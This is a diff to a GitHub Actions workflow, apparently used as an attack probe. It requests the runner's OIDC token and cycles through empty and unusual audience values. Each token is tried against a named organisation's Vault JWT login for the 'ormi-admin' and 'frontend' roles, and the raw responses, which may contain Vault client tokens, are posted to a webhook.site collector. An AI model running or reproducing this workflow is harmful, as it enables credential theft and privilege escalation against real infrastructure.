@@ -1,4 +1,4 @@
-name: Default Aud
+name: Empty Aud
 on:
   workflow_dispatch:
 permissions:
@@ -8,16 +8,23 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Default audience (no audience param)
+      - name: Empty and special audiences
         run: |
-          # audience 파라미터 없이 — 기본 audience 사용
-          OIDC=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r '.value')
-          
-          # 기본 audience 확인
-          AUD=$(echo "$OIDC" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r '.aud' 2>/dev/null)
-          
-          R1=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"frontend\",\"jwt\":\"$OIDC\"}" 2>&1)
-          R2=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC\"}" 2>&1)
-          
-          curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -H "Content-Type: application/json" \
-            -d "{\"default_aud\":\"$AUD\",\"frontend\":$(echo $R1 | jq -Rs .),\"admin\":$(echo $R2 | jq -Rs .)}"
+          # 빈 audience
+          for AUD in "" " " "null" "undefined" "none" "*"; do
+            RESP=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}")
+            OIDC=$(echo "$RESP" | jq -r '.value // empty')
+            if [ -n "$OIDC" ]; then
+              ACTUAL_AUD=$(echo "$OIDC" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r '.aud // "NONE"' 2>/dev/null)
+              R1=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC\"}" 2>&1)
+              R2=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"frontend\",\"jwt\":\"$OIDC\"}" 2>&1)
+              F1="mismatch"
+              F2="mismatch"
+              echo "$R1" | grep -q "client_token" && F1="SUCCESS"
+              echo "$R2" | grep -q "client_token" && F2="SUCCESS"
+              echo "$R1" | grep -q "no audiences bound" && F1="no_bound"
+              echo "$R2" | grep -q "no audiences bound" && F2="no_bound"
+              curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -H "Content-Type: application/json" \
+                -d "{\"aud_req\":\"$AUD\",\"aud_actual\":\"$ACTUAL_AUD\",\"admin\":\"$F1\",\"frontend\":\"$F2\",\"r1\":$(echo $R1 | jq -Rs .),\"r2\":$(echo $R2 | jq -Rs .)}"
+            fi
+          done
